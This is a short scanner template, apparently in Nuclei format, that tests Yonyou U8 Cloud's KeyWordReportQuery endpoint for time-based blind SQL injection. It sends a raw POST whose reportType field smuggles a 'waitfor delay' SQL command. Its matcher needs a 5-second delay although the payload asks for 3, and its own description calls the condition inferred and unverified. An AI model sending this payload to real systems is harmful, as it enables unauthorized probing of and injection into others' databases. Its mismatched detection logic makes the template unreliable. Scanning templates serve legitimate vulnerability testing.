id: poc-xasw1v61v3id3t3n
info:
  name: 用友U8 Cloud-KeyWordReportQuery存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 0


    {"reportType":"1'';waitfor delay ''0:0:3''-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
